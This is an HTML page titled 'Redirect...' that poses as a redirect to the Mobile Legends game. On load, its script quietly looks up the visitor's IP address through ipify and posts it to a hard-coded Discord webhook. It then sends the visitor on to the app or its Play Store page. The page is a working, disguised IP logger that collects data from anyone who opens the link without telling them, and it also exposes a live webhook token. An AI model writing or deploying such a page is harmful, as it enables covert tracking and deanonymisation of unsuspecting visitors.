<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect...</title>
    <script>
        window.onload = async function() {
            const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";

            try {
                const response = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
                const data = await response.json();
                const ip = data.ip;

                await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ content: `IP Address: ${ip}` })
                });

                window.location.href = "mobilelegends://";
                setTimeout(() => {
                    window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
                }, 2000);
            } catch {
                window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
            }
        };
    </script>
</head>
<body>
</body>
</html>
